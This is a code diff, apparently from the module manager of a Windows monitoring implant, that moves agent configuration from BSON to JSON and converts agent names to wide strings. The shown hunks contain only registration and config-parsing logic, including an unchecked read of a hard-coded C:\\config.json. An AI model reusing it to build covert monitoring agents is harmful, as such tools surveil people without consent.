@@ -1,11 +1,9 @@
-#include "bson.h"
 #include <windows.h>
 #include "common.h"
 #include "H4-DLL.h"
 #include "AM_Core.h"
 #include "LOG.h"
-
-using namespace bson;
+#include "JSON\JSON.h"
 
 // XXX Definita in HM_IpcModule!!!!
 #define MAX_MSG_LEN 512 // Lunghezza di un messaggio
@@ -51,18 +49,20 @@ extern void PM_ApplicationRegister();
 extern void PM_PDAAgentRegister();
 extern void PM_ContactsRegister();
 
+typedef void (WINAPI *conf_callback_t)(JSONObject);
+extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
 void AM_SuspendRestart(DWORD);
 
 
 typedef DWORD (__stdcall *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
 typedef DWORD (__stdcall *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
-typedef DWORD (__stdcall *PMI_Generic_t) (be); // Prototipo per l'Init
+typedef DWORD (__stdcall *PMI_Generic_t) (JSONObject); // Prototipo per l'Init
 typedef DWORD (__stdcall *PMU_Generic_t) (void); // Prototipo per l'UnRegister
 
 #define AM_MAXDISPATCH 50
 
 typedef struct {
-	char agent_name[32];
+	WCHAR agent_name[32];
 	DWORD agent_tag;
 	PMD_Generic_t pDispatch; 
 	PMS_Generic_t pStartStop; 
@@ -247,11 +247,11 @@ void AM_IPCAgentStartStop(DWORD dwTag, BOOL bStartFlag)
 
 // Registra il Monitor con le funzioni di Init, StartStop e Dispatch
 // Viene richiamata dalle funzioni di registrazione dei monitor.
-DWORD AM_MonitorRegisterBSON(char *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
+DWORD AM_MonitorRegisterBSON(WCHAR *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
 {
 	if(dwDispatchCnt >= AM_MAXDISPATCH)
 		return NULL;
-	sprintf_s(aDispatchArray[dwDispatchCnt].agent_name, "%s", agent_name);
+	swprintf_s(aDispatchArray[dwDispatchCnt].agent_name, sizeof(aDispatchArray[dwDispatchCnt].agent_name)/ sizeof(WCHAR), L"%s", agent_name);
 	aDispatchArray[dwDispatchCnt].agent_tag = agent_tag;
 	aDispatchArray[dwDispatchCnt].pDispatch = (PMD_Generic_t) pDispatch;
 	aDispatchArray[dwDispatchCnt].pStartStop = (PMS_Generic_t) pStartStop;
@@ -305,17 +305,17 @@ DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
 }
 
 // Prende il tag di un agente per nome
-DWORD AM_GetAgentTag(const char *agent_name)
+DWORD AM_GetAgentTag(const WCHAR *agent_name)
 {
 	DWORD i;
 	for(i=0; i<dwDispatchCnt; i++) 
-		if(!stricmp(agent_name, aDispatchArray[i].agent_name))
+		if(!wcsicmp(agent_name, aDispatchArray[i].agent_name))
 			return aDispatchArray[i].agent_tag;
 	return 0xFFFFFFFF;
 }
 
 // Esegue l'init di un monitor
-DWORD AM_MonitorInit(DWORD dwTag, be elem)
+DWORD AM_MonitorInit(DWORD dwTag, JSONObject elem)
 {
 	DWORD i;
 
@@ -434,20 +434,22 @@ DWORD AM_Startup()
 
 
 // Legge la configurazione degli agent da file
+void WINAPI ParseModules(JSONObject module)
+{
+	AM_MonitorInit(AM_GetAgentTag(module[L"module"]->AsString().c_str()), module);	
+}
+
 void UpdateAgentConf()
 {
-	char conf_bson[6000];
+	char conf_json[6000];
 	DWORD readn;
 
 	// XXX Da modificare
-	HANDLE hfile = CreateFile("C:\\config.bson", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
-	ReadFile(hfile, conf_bson, sizeof(conf_bson), &readn, NULL);
+	ZeroMemory(conf_json, sizeof(conf_json));
+	HANDLE hfile = CreateFile("C:\\config.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	ReadFile(hfile, conf_json, sizeof(conf_json), &readn, NULL);
 
-	BSONObj p(conf_bson);
-	for( bo::iterator i(p["modules"].Obj()); i.more(); )  {
-		be module = i.next();
-		AM_MonitorInit(AM_GetAgentTag(module["module"].String().c_str()), module);	
-	}
+	HM_ParseConfSection(conf_json, L"modules", &ParseModules);
 }
 
 
